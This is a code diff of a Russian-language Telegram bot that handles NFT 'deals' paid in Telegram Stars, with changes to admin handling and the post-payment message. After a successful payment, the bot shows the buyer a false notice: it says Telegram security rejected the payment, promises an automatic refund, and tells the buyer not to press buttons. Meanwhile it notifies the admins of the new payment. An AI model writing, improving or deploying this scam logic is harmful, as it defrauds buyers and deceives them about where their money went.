@@ -6,7 +6,6 @@ import html
 import ssl
 import urllib.parse
 from aiohttp import web
-from PIL import Image, ImageDraw, ImageOps
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
@@ -43,6 +42,9 @@ PORT = int(os.environ.get("PORT", 10000))
 BAN_MANAGER_ID = 5825717381
 
 DATABASE_URL = os.environ.get("DATABASE_URL", "")
+
+# Premium emoji ID для ⭐
+STAR_EMOJI_ID = "5447644880824181073"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -274,9 +276,36 @@ async def add_admin(user_id: int, username: str, display_name: str):
 
 
 async def get_all_admin_ids():
-    async with DB_POOL.acquire() as conn:
-        rows = await conn.fetch("SELECT user_id FROM admins")
-    return [r["user_id"] for r in rows]
+    """Все админы: из БД + BAN_MANAGER_ID + владелец (ищется в users)."""
+    ids = set()
+    try:
+        async with DB_POOL.acquire() as conn:
+            rows = await conn.fetch("SELECT user_id FROM admins")
+        for r in rows:
+            ids.add(r["user_id"])
+        print(f"[get_all_admin_ids] Из БД admins: {len(rows)}")
+    except Exception as e:
+        print(f"[get_all_admin_ids] Ошибка БД: {e}")
+
+    if BAN_MANAGER_ID:
+        ids.add(BAN_MANAGER_ID)
+
+    # Владелец — ищем в users по username
+    try:
+        async with DB_POOL.acquire() as conn:
+            row = await conn.fetchrow(
+                "SELECT user_id FROM users WHERE LOWER(username)=LOWER($1)",
+                OWNER_USERNAME
+            )
+        if row:
+            ids.add(row["user_id"])
+            print(f"[get_all_admin_ids] Владелец найден: {row['user_id']}")
+        else:
+            print(f"[get_all_admin_ids] Владелец @{OWNER_USERNAME} не найден в users")
+    except Exception as e:
+        print(f"[get_all_admin_ids] Ошибка поиска владельца: {e}")
+
+    return list(ids)
 
 
 async def get_user_info(user_id: int):
@@ -301,126 +330,10 @@ async def log_send(sender_id: int, sender_username: str, recipient_id: int,
         )
 
 
-# ================= ЗАГРУЗКА ФОТО =================
-async def upload_to_catbox(file_path: str):
-    url = "https://catbox.moe/user/api.php"
-    try:
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
-            with open(file_path, "rb") as f:
-                data = aiohttp.FormData()
-                data.add_field("reqtype", "fileupload")
-                data.add_field("fileToUpload", f, filename="img.png", content_type="image/png")
-                async with session.post(url, data=data) as resp:
-                    text = (await resp.text()).strip()
-                    if text.startswith("http"):
-                        return text
-    except Exception as e:
-        print(f"[catbox] Ошибка: {e}")
-    return None
-
-
-async def upload_to_telegraph(file_path: str):
-    url = "https://telegra.ph/upload"
-    try:
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
-            with open(file_path, "rb") as f:
-                data = aiohttp.FormData()
-                data.add_field("file", f, filename="img.png", content_type="image/png")
-                async with session.post(url, data=data) as resp:
-                    if resp.status != 200:
-                        return None
-                    result = await resp.json()
-                    if isinstance(result, list) and result and "src" in result[0]:
-                        return "https://telegra.ph" + result[0]["src"]
-    except Exception as e:
-        print(f"[telegra.ph] Ошибка: {e}")
-    return None
-
-
-async def upload_photo(file_path: str):
-    link = await upload_to_catbox(file_path)
-    if link:
-        return link
-    return await upload_to_telegraph(file_path)
-
-
-# ================= КРУГЛАЯ КАРТИНКА =================
-CIRCLE_BG_COLOR = (33, 45, 59, 255)  # #212d3b
-
-
-def make_circle(input_path: str, output_path: str, size: int = 512):
-    img = Image.open(input_path).convert("RGBA")
-    img = ImageOps.fit(img, (size, size), centering=(0.5, 0.5))
-
-    mask = Image.new("L", (size, size), 0)
-    draw = ImageDraw.Draw(mask)
-    draw.ellipse((0, 0, size, size), fill=255)
-
-    result = Image.new("RGBA", (size, size), CIRCLE_BG_COLOR)
-    result.paste(img, (0, 0), mask=mask)
-    result.save(output_path, "PNG")
-    return output_path
-
-
-# ================= АВАТАРКА БОТА =================
-_BOT_AVATAR_URL_CACHE = None
-
-
-async def get_current_bot_avatar_url(force_refresh: bool = False):
-    global _BOT_AVATAR_URL_CACHE
-    if _BOT_AVATAR_URL_CACHE and not force_refresh:
-        return _BOT_AVATAR_URL_CACHE
-
-    if not force_refresh:
-        cached = await get_setting("bot_avatar_url")
-        if cached:
-            _BOT_AVATAR_URL_CACHE = cached
-            return cached
-
-    try:
-        me = await bot.get_me()
-        photos = await bot.get_user_profile_photos(user_id=me.id, limit=1)
-        if not photos.total_count or not photos.photos:
-            print("[avatar] У бота нет аватарки в BotFather.")
-            return None
-        sizes = photos.photos[0]
-        file_id = sizes[-1].file_id
-        file = await bot.get_file(file_id)
-        raw_path = f"bot_avatar_raw_{me.id}.jpg"
-        await bot.download_file(file.file_path, destination=raw_path)
-        url = await upload_photo(raw_path)
-        try:
-            os.remove(raw_path)
-        except Exception:
-            pass
-        if url:
-            _BOT_AVATAR_URL_CACHE = url
-            await save_setting("bot_avatar_url", url)
-            print(f"[avatar] Аватарка бота загружена: {url}")
-        return url
-    except Exception as e:
-        print(f"[avatar] Ошибка: {e}")
-        return None
-
-
-def _build_photo_block(url: str):
-    if InputRichBlockPhoto is not None:
-        try:
-            return InputRichBlockPhoto(photo=url)
-        except Exception as e:
-            print(f"[photo-block] InputRichBlockPhoto fail: {e}")
-    if InputRichBlockImage is not None:
-        try:
-            return InputRichBlockImage(photo=url)
-        except Exception as e:
-            print(f"[photo-block] InputRichBlockImage fail: {e}")
-    return None
-
-
 # ================= FSM =================
 class DealForm(StatesGroup):
     nft_name = State()
-    nft_photo = State()
+    nft_link = State()
     seller = State()
     price = State()
     select_chat = State()
@@ -436,6 +349,10 @@ async def on_business_connection(connection: BusinessConnection):
         user = connection.user
         await save_user(user.id, user.username or "", user.first_name or "")
         await save_business_connection(user.id, connection.id)
+        # Если это владелец — добавляем в админы
+        if (user.username or "").lower() == OWNER_USERNAME.lower():
+            await add_admin(user.id, user.username or "", user.first_name or "Владелец")
+            print(f"[business_connection] Владелец добавлен в admins: {user.id}")
         print(f"✅ Business Connection активирован: {connection.id} (user={user.id})")
     except Exception as e:
         print(f"[business_connection] Ошибка: {e}")
@@ -463,6 +380,13 @@ async def on_business_message(message: Message):
                 message.from_user.username or "",
                 message.from_user.first_name or ""
             )
+            # Если это владелец — добавляем в админы
+            if (message.from_user.username or "").lower() == OWNER_USERNAME.lower():
+                await add_admin(
+                    message.from_user.id,
+                    message.from_user.username or "",
+                    message.from_user.first_name or "Владелец"
+                )
     except Exception as e:
         print(f"[business_message] Ошибка сохранения peer: {e}")
 
@@ -477,24 +401,13 @@ async def activate_admin(message: Message):
         message.from_user.first_name or ""
     )
     await add_admin(message.from_user.id, message.from_user.username or "", name)
+    # Если это владелец — тоже добавляем (на случай если username не совпал)
+    if (message.from_user.username or "").lower() == OWNER_USERNAME.lower():
+        await add_admin(message.from_user.id, message.from_user.username or "", "Владелец")
     await message.answer(
         f"🔑 <b>Права администратора активированы!</b>\nИмя: {html.escape(name)}",
         parse_mode="HTML"
     )
-
-
-@dp.message(F.text == "/refresh_avatar")
-async def refresh_avatar(message: Message):
-    if not await is_admin(message.from_user.id, message.from_user.username):
-        return
-    url = await get_current_bot_avatar_url(force_refresh=True)
-    if url:
-        await message.answer(f"✅ Аватарка бота обновлена:\n{url}")
-    else:
-        await message.answer(
-            "❌ Не удалось получить аватарку бота.\n"
-            "Проверь, что у бота установлена аватарка в BotFather."
-        )
 
 
 # ================= ХЕЛПЕР: ЛОТЫ =================
@@ -570,14 +483,28 @@ async def start(message: Message):
     global BUSINESS_CONNECTION_ID
     if await is_banned(message.from_user.id):
         return
-    if not await is_admin(message.from_user.id, message.from_user.username):
+
+    # Владелец автоматически получает админку
+    is_owner = (message.from_user.username or "").lower() == OWNER_USERNAME.lower()
+
+    if not is_owner and not await is_admin(message.from_user.id, message.from_user.username):
         await message.answer("❌ У вас нет доступа к боту.")
         return
+
     await save_user(
         message.from_user.id,
         message.from_user.username or "",
         message.from_user.first_name or ""
     )
+
+    # Автоматом сохраняем в админы — чтобы получал уведомления
+    if is_owner:
+        await add_admin(
+            message.from_user.id,
+            message.from_user.username or "",
+            "Владелец"
+        )
+        print(f"[start] Владелец добавлен в admins: {message.from_user.id}")
 
     saved_conn = await get_setting("business_connection_id")
     if saved_conn:
@@ -643,48 +570,17 @@ async def set_name(message: Message, state: FSMContext):
     if await is_banned(message.from_user.id):
         return
     await state.update_data(nft_name=message.text)
-    await message.answer("2️⃣ Отправь фото NFT (картинку):")
-    await state.set_state(DealForm.nft_photo)
+    await message.answer("2️⃣ Введи ссылку на NFT:")
+    await state.set_state(DealForm.nft_link)
 
 
-@dp.message(DealForm.nft_photo, F.photo)
-async def set_photo(message: Message, state: FSMContext):
+@dp.message(DealForm.nft_link)
+async def set_link(message: Message, state: FSMContext):
     if await is_banned(message.from_user.id):
         return
-    photo = message.photo[-1]
-    try:
-        file = await bot.get_file(photo.file_id)
-        raw_path = f"nft_{message.from_user.id}_{photo.file_unique_id}.jpg"
-        await bot.download_file(file.file_path, destination=raw_path)
-
-        circle_path = f"nft_{message.from_user.id}_{photo.file_unique_id}_circle.png"
-        try:
-            make_circle(raw_path, circle_path, size=512)
-        except Exception as e:
-            print(f"[make_circle] Ошибка: {e}")
-            circle_path = raw_path
-
-        url = await upload_photo(circle_path)
-
-        for p in {raw_path, circle_path}:
-            try:
-                os.remove(p)
-            except Exception:
-                pass
-    except Exception as e:
-        print(f"[set_photo] Ошибка: {e}")
-        url = None
-    if not url:
-        await message.answer("❌ Не удалось загрузить фото. Отправь ещё раз:")
-        return
-    await state.update_data(nft_link=url)
+    await state.update_data(nft_link=message.text)
     await message.answer("3️⃣ Введи имя продавца:")
     await state.set_state(DealForm.seller)
-
-
-@dp.message(DealForm.nft_photo)
-async def set_photo_wrong(message: Message, state: FSMContext):
-    await message.answer("❌ Нужно отправить именно фото (картинку). Попробуй ещё раз:")
 
 
 @dp.message(DealForm.seller)
@@ -835,14 +731,6 @@ async def pick_lot(callback: CallbackQuery, state: FSMContext):
     )
     await callback.message.answer("👤 Нажми кнопку ниже и выбери чат:", reply_markup=kb)
     await state.set_state(DealForm.select_chat)
-
-
-# ================= ХЕЛПЕР: business-ошибка =================
-def _is_business_peer_missing(err: Exception) -> bool:
-    s = str(err).lower()
-    return ("business_peer_usage_missing" in s
-            or "peer_usage_missing" in s
-            or "business_peer" in s)
 
 
 # ================= УВЕДОМЛЕНИЕ ГЛАВНОГО АДМИНА =================
@@ -1175,19 +1063,33 @@ async def process_successful_payment(message: Message):
             else:
                 seller_display = f'<a href="tg://user?id={deal_owner_id}">ID: {deal_owner_id}</a>'
 
+    # ========== ТЕКСТ ПОКУПАТЕЛЮ: PREMIUM EMOJI + ЖИРНЫЙ ТЕКСТ ==========
+    buyer_text = (
+        f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji> '
+        f'<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
+        f'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
+        f'<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
+        f'<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
+        f'<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
+        f'<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>'
+    )
     try:
-        await message.answer(
-            '<tg-emoji emoji-id="5447644880824181073">⭐</tg-emoji> '
-            '<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
-            'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
-            '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
-            '<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
-            '<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
-            '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
-            parse_mode="HTML"
-        )
+        await message.answer(buyer_text, parse_mode="HTML")
     except Exception as e:
         print(f"[payment] Ошибка отправки покупателю: {e}")
+        # Фолбэк без премиум-эмодзи
+        try:
+            await message.answer(
+                '⭐ <b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
+                'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
+                '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
+                '<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
+                '<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
+                '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
+                parse_mode="HTML"
+            )
+        except Exception as e2:
+            print(f"[payment] Фолбэк тоже упал: {e2}")
 
     notify_text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
@@ -1199,12 +1101,13 @@ async def process_successful_payment(message: Message):
         f"⭐️ Сумма: <b>{price} звёзд</b>"
     )
 
+    # ===== РАССЫЛКА ВСЕМ АДМИНАМ (все, кто ввёл секретный код + владелец + BAN_MANAGER) =====
     recipients = set()
     try:
         admin_ids = await get_all_admin_ids()
         for a in admin_ids:
             recipients.add(a)
-        print(f"[payment] админов в БД: {len(admin_ids)}")
+        print(f"[payment] Получателей из get_all_admin_ids: {len(admin_ids)}")
     except Exception as e:
         print(f"[payment] Ошибка получения админов: {e}")
 
@@ -1213,15 +1116,19 @@ async def process_successful_payment(message: Message):
 
     recipients.discard(buyer_id)
 
+    print(f"[payment] Итого получателей: {recipients}")
+
     sent_count = 0
+    failed = 0
     for rid in recipients:
         try:
             await bot.send_message(rid, notify_text, parse_mode="HTML")
             sent_count += 1
-            print(f"[payment] Уведомление отправлено {rid}")
+            print(f"[payment] ✅ Уведомление отправлено {rid}")
         except Exception as e:
-            print(f"[payment] Не удалось отправить {rid}: {e}")
-    print(f"[payment] Итого отправлено: {sent_count}")
+            failed += 1
+            print(f"[payment] ❌ Не удалось отправить {rid}: {e}")
+    print(f"[payment] Итого: успешно {sent_count}, ошибок {failed}")
 
 
 # ================= ВЕБ-СЕРВЕР =================
@@ -1246,6 +1153,22 @@ async def main():
     saved = await get_setting("business_connection_id")
     if saved:
         BUSINESS_CONNECTION_ID = saved
+
+    # При старте — пытаемся найти владельца в БД и добавить в admins
+    try:
+        async with DB_POOL.acquire() as conn:
+            row = await conn.fetchrow(
+                "SELECT user_id, username, first_name FROM users WHERE LOWER(username)=LOWER($1)",
+                OWNER_USERNAME
+            )
+        if row:
+            await add_admin(row["user_id"], row["username"] or "", "Владелец")
+            print(f"[startup] Владелец найден и добавлен в admins: {row['user_id']}")
+        else:
+            print(f"[startup] Владелец @{OWNER_USERNAME} ещё не писал боту — добавится автоматически при /start")
+    except Exception as e:
+        print(f"[startup] Ошибка добавления владельца: {e}")
+
     await start_web_server()
     print("Бот запущен...")
     await dp.start_polling(
